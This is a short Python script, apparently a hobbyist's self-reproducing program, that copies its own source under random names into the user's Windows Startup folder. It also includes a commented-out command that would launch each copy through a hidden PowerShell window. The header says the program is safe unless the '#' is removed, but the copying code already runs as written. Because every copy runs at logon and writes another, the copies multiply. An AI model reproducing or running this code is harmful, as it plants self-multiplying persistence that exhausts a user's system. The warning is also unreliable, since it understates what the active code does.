'''

Caution! Do not remove # and run this program, it is very destructive.

'''
'''

self-reproducing program by Li Ka Lok, Jack.
Aim keep reproducing itself in the window startup folder. only work for windows
10 or below

'''
import os
import random
import numpy as np

with open(__file__, "r") as f:
    selfs = f.readlines()
    name = random.randint(0, 9999999999999)
    name = f"main{name}.py"
    current_dir = os.getcwd()
    n = current_dir.find("Users\\")  # +6
    startdir = current_dir[:n+6]
    check = current_dir[n+6:]
    m = check.find("\\")
    username = check[:m]
    addlocation = "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
    startupdir = startdir+username+addlocation+"\\"
    name = f"{startupdir}{name}"
    print(name)
    with open(name, "w+") as g:
        g.writelines(selfs)
        #os.system(f"start /min powershell -windowStyle Hidden -noExit -command \"{name}\"")
            

